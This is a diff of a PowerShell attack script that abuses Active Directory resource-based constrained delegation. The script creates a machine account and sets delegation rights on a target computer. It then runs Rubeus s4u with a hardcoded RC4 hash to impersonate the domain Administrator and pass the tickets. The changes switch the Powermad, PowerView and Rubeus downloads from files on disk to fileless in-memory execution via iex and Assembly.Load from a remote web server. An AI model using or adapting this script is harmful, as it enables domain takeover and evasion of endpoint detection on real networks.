@@ -7,24 +7,19 @@
 param($WebServer, $Target, $Domain)
 # get current directory
 $ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
-# Get the files to the current directory
+# load the files into memory and import them
 Write-Host "[+] Check if the files are present"
 
 If (-Not(Test-Path -Path "$ScriptDir\Powermad.ps1")){
-(New-Object System.Net.WebClient).DownloadFile("http://$WebServer/Powermad.ps1", "$ScriptDir\Powermad.ps1")
+iex(New-Object System.Net.WebClient).DownloadString("http://$WebServer/Powermad.ps1")
 }
 If (-Not(Test-Path -Path "$ScriptDir\PowerView.ps1")){
-(New-Object System.Net.WebClient).DownloadFile("http://$WebServer/PowerView.ps1", "$ScriptDir\PowerView.ps1")
+iex(New-Object System.Net.WebClient).DownloadString("http://$WebServer/PowerView.ps1")
 }
 If (-Not(Test-Path -Path "$ScriptDir\Rubeus.exe")){
-(New-Object System.Net.WebClient).DownloadFile("http://$WebServer/Rubeus.exe", "$ScriptDir\Rubeus.exe")
+$ruby = (New-Object System.Net.WebClient).DownloadData("http://$WebServer/Rubeus.exe")
+$assem = [System.Reflection.Assembly]::Load($ruby)
 }
-
-# import the necessary toolsets
-Write-Host "[+] Importing Modules if needed"
-
-Import-Module -Name "$ScriptDir\Powermad.ps1" -Verbose
-Import-Module -Name "$ScriptDir\PowerView.ps1" -Verbose
 
 # generate a random computer name
 $MachineName = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
@@ -48,16 +43,11 @@ Write-Host "[+] Set the msds-allowedtoactonbehalfofotheridentity property"
 # set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
 Get-DomainComputer $Target | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 
+# purge tickets
+[Rubeus.Program]::Main("purge".Split())
+
 $fqdn = -join($Target,".",$Domain)
-
-# purge existing tickets with rubeus
-.\Rubeus.exe purge
-
 # execute Rubeus' s4u process against $TargetComputer
 #   AA6EAFB522589934A6E5CE92C6438221 == 'h4x'
 #   impersonating "Administrator" (a DA) to the cifs sname for the target computer (primary)
-.\Rubeus.exe s4u /user:"$MachineName`$" /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:cifs/$fqdn /altservice:http,ldap,krbtgt,winrm /ptt
-
-# unload modules to avoid "unable to find function" errors when running this script twice
-Remove-Module Powermad
-Remove-Module PowerView
+[Rubeus.Program]::Main("s4u /user:$MachineName`$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:cifs/$fqdn /altservice:http,ldap,krbtgt,winrm /ptt".Split())
